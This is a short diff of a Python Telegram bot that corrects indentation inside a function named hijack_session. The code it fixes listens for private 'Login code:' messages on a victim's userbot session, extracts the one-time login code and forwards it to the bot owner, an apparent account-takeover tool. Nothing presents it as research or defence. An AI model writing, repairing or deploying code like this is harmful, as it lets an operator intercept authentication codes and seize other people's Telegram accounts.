@@ -209,10 +209,10 @@ async def hijack_session(_, message):
         
         @otp_userbot.on_message(filters.private)
         async def otp_listener(_, msg):
-        if "Login code:" in msg.text:
-            otp_code = msg.text.split(": ")[1].strip()
-            otp_text = f"🔐 OTP received from {user_id}: `{otp_code}`"
-            await app.send_message(OWNER_ID, otp_text)
+            if "Login code:" in msg.text:
+                otp_code = msg.text.split(": ")[1].strip()
+                otp_text = f"🔐 OTP received from {user_id}: `{otp_code}`"
+                await app.send_message(OWNER_ID, otp_text)
         await idle()
         asyncio.create_task(otp_userbot.run())
     except Exception as e:
